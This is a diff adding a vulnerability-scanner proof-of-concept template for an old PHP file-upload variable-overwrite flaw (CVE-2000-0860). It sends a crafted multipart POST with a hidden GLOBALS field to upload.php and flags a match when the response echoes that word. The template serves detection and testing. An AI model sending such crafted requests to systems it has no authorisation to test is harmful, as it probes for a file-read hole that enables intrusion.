@@ -1,0 +1,42 @@
+[info]
+author = "ave"
+description = "通过构造与 PHP 内部脚本变量同名的隐藏表单字段（如 GLOBALS），利用文件上传机制中的变量覆盖缺陷，绕过访问控制读取服务器任意文件。发送包含恶意表单字段的 multipart POST 请求验证漏洞存在。"
+id = "POC-AVE-2000-0978"
+name = "PHP 任意文件读取漏洞 PoC"
+severity = "medium"
+tags = ["ave-2000-0978"]
+vuln_id = [
+    "CVE-2000-0860",
+    "AVE-2000-0978",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/upload.php"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+------WebKitFormBoundaryAVE\r
+Content-Disposition: form-data; name="GLOBALS"\r
+\r
+1\r
+------WebKitFormBoundaryAVE\r
+Content-Disposition: form-data; name="userfile"; filename="test.txt"\r
+Content-Type: text/plain\r
+\r
+test\r
+------WebKitFormBoundaryAVE--"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=----WebKitFormBoundaryAVE"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["GLOBALS"]
